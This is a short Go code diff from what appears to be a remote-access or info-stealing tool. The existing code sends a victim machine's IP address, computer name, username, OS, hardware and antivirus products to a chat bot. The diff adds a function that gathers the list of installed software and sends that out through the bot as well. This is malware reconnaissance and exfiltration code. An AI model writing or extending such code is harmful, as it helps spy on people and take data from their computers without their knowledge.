@@ -17,6 +17,7 @@ import (
 const (
 	fmtInfo = "```\nIP Address: %s\nComputer name: %s\nUsername: [%s] %s\nOperating System: %s %s\n" +
 		"CPU: %s\nGPU: %s\nMemory: %s\nAV:\n    %s\n```"
+	softInfo = "```\nInstalled Software:\n    %s```"
 )
 
 func Info() {
@@ -42,4 +43,9 @@ func Info() {
 	)
 	cfg.ParseMode = "Markdown"
 	api.Bot.Send(cfg)
+}
+
+func Software() {
+	soft := util.SoftwareInfo()
+	api.SendFragmented(soft, "\n", "```\n", "```")
 }
